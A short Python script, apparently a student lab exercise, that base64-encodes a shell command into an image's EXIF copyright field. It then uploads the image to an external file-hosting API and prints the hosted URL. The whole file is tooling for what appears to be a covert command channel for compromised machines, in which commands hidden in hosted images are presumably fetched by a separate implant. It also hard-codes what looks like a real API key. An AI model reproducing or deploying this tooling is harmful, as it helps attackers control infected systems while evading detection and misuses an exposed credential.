# LB07 - Alfredo Thomas Novanski (2301924536)

import sys, base64, requests
from os import path
from sys import argv
from exif import Image
from getopt import getopt

FILE = {"filename": path.basename(__file__)}

usage_text = (
	"Usage: \n"
	"\t%(filename)s -f <FILENAME> -c <COMMAND>"
) % FILE

FILENAME = ''
COMMAND = ''

def inject_upload():
	with open(FILENAME, 'rb') as img:
		image = Image(img)
	image.copyright = base64.b64encode(COMMAND.encode()).decode()
	with open('injected_image.png', 'wb') as injected_image:
		injected_image.write(image.get_file())
	injected_image = open('injected_image.png', 'rb').read()

	headers = {
		'Content-Type': 'image/png'
	}
	post_image = requests.post('https://www.filestackapi.com/api/store/S3?key=AEcmlgqRHRdGOHqea5HRRz', data=injected_image, headers=headers)
	response = post_image.json()['url']
	print("[!] Image URL: " + response)


def main():
	global FILENAME, COMMAND

	cmd_args, gopt = getopt(argv[1:], "f:c:", ["filename=", "command="])
	if not cmd_args:
		print(usage_text)
		sys.exit()

	for opt, val in cmd_args:
		if(opt in ["-f", "--file"]):
			FILENAME = val
		elif(opt in ["-c", "--command"]):
			COMMAND = val
	inject_upload()

if __name__ == "__main__":
	main()